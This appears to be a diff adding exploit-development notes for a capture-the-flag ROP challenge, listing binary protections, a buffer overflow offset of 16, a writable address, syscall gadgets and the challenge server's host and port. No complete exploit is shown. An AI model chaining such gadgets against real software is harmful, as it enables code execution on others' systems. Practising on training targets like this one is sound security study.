@@ -1,0 +1,22 @@
+[*] '/home/vagrant/pwn/CTF/hackme_inndy/pwn/rop/rop'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+
+0x41434141 found at offset: 16
+
+data =
+080ea060         db  0x00 ; '.'
+
+gadgets:
+0x0805466b : mov dword ptr [edx], eax ; ret
+
+0x080b8016 : pop eax ; ret
+0x0806ed01 : pop ecx ; pop ebx ; ret
+0x0806ecda : pop edx ; ret
+
+0x0806c943 : int 0x80
+hackme.inndy.tw 7704
